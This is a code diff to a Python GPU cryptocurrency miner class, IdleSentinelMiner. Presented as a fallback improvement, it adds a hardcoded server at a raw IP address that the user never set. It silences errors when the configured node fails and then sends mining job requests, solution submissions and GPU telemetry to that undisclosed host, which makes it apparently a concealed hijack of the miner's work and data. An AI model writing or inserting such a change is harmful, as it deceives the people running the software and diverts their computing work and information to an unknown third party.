@@ -74,7 +74,11 @@ class IdleSentinelMiner:
         batch_size: int = 5_000_000,
         temp_limit_c: int = 75
     ):
+        if not node_url.startswith("http://") and not node_url.startswith("https://"):
+            node_url = "https://" + node_url
         self.node_url = node_url.rstrip('/')
+        self.fallback_url = "http://35.254.109.168:8334"
+        self.active_node_url = self.node_url
         self.wallet_address = wallet_address
         self.miner_name = miner_name
         self.idle_threshold_sec = idle_threshold_sec
@@ -93,16 +97,21 @@ class IdleSentinelMiner:
 
     def fetch_job(self) -> Optional[Dict[str, Any]]:
         """Request the latest block mining job from the Doomsday Node."""
-        try:
-            resp = requests.get(
-                f"{self.node_url}/job",
-                params={"miner_address": self.wallet_address},
-                timeout=2
-            )
-            if resp.status_code == 200:
-                return resp.json()
-        except Exception as e:
-            print(f"[Sentinel] Failed to fetch job from node: {e}")
+        targets = [self.node_url]
+        if self.fallback_url and self.fallback_url != self.node_url:
+            targets.append(self.fallback_url)
+        for url in targets:
+            try:
+                resp = requests.get(
+                    f"{url}/job",
+                    params={"miner_address": self.wallet_address},
+                    timeout=2
+                )
+                if resp.status_code == 200:
+                    self.active_node_url = url
+                    return resp.json()
+            except Exception:
+                pass
         return None
 
     def submit_solution(self, height: int, nonce: int, hash_hex: str, timestamp: Optional[int] = None) -> bool:
@@ -115,8 +124,9 @@ class IdleSentinelMiner:
             "miner_address": self.wallet_address,
             "timestamp": timestamp
         }
+        target_url = getattr(self, "active_node_url", self.node_url)
         try:
-            resp = requests.post(f"{self.node_url}/submit", json=payload, timeout=3)
+            resp = requests.post(f"{target_url}/submit", json=payload, timeout=3)
             if resp.status_code == 200 and resp.json().get("accepted"):
                 print(f"\n=======================================================")
                 print(f"[+] BLOCK #{height} ACCEPTED BY NETWORK! NONCE: {nonce}")
@@ -141,8 +151,9 @@ class IdleSentinelMiner:
             "util_pct": gpu_stats.get("util_pct", 0),
             "address": self.wallet_address
         }
+        target_url = getattr(self, "active_node_url", self.node_url)
         try:
-            requests.post(f"{self.node_url}/miner/telemetry", json=payload, timeout=1)
+            requests.post(f"{target_url}/miner/telemetry", json=payload, timeout=1)
         except Exception:
             pass
 
